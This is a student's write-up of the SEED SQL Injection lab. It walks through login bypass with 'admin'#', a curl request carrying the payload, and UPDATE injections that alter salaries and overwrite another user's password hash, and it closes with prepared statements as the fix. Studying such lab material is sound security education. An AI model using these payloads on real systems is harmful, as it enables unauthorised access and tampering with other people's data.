# SQL Injection Attack Lab

# Fei Guo

lab url: https://seedsecuritylabs.org/Labs_20.04/Files/Web_SQL_Injection/Web_SQL_Injection.pdf

## Task 2: SQL Injection Attack on SELECT Statement

### Task 2.1: SQL Injection Attack from webpage.

If the name field is not sanitized before being concatenated to a SQL query, then we can inject this:

`admin'#`

to construct a SQL query like:

`WHERE name=’admin’#' and Password=’$hashed_pwd’”;`

And everything after '#' will be commented out, making the statement always return an admin record.

### Task 2.2: SQL Injection Attack from command line

Similar to above, we can use curl to do the injection:

`curl 'www.seed-server.com/unsafe_home.php?username=admin%27%23#&Password=12345'`

Note here we need to quote the url, so `admin'#` becomes `admin%27%23`. Also we need to put the entire URL between a pair of single quotes. 

To do the quoting, do this in Python:
```python
In [222]: from urllib import parse
In [223]: parse.quote("admin'#")
Out[223]: 'admin%27%23'
```

### Task 2.3: Append a new SQL statement

We can't succeed in appending a new SQL statement in the name field because `mysqli::query()` API in PHP doesn't allow more than one queries to be executed in one time.

## Task 3: SQL Injection Attack on UPDATE Statement

### Task 3.1: Modify your own salary

With an update statement like this in PHP:

```sql
$sql = "UPDATE credential SET nickname='$input_name', ,email='$input_email',address='$input_address',Password='$hashed_pwd', PhoneNumber='$input_phonenumber' WHERE ID=$id;";
```
We can input this in the $input_name field:

`', salary='500000`

to get something like this and change the "hidden" (not intended to be modified) field:

```sql
$sql = "UPDATE credential SET nickname='alice', salary='500000',email='$input_email',address='$input_address',Password='$hashed_pwd', PhoneNumber='$input_phonenumber' WHERE ID=$id;";
```

### Task 3.2: Modify Other People’s Salaries

Similarly, we can change other people's salary by inputing this in the name field:

`', salary=1 WHERE Name='Boby';#`

### Task 3.3: Modify other people’ password

Since the password is sha1-hashed before being stored, we need to computer the sha1 value of the password before updating so we know the original one.

For example, 
```bash
➜  NetRead git:(main) echo deadbeef | shasum
b39e528efc3afe2def4bbc39de17f2b82cd8bd0d  -
```

Then to modify other people's password, we just input this in the name field:

`', Password='b39e528efc3afe2def4bbc39de17f2b82cd8bd0d' WHERE Name=’Boby’;#`

## Task 4: Countermeasure — Prepared Statement

We can use mysqli's api to first do `prepare` and send mysql the code part, and then do `bind_params` to send the data part to mysql. After that, we can execute the query and fetch the result. Here is the given demo:
```
$stmt = $conn->prepare("SELECT name, local, gender FROM USER_TABLE WHERE id = ? and password = ? ");
// Bind parameters to the query
$stmt->bind_param("is", $id, $pwd);
$stmt->execute();
$stmt->bind_result($bind_name, $bind_local, $bind_gender);
$stmt->fetch();
```







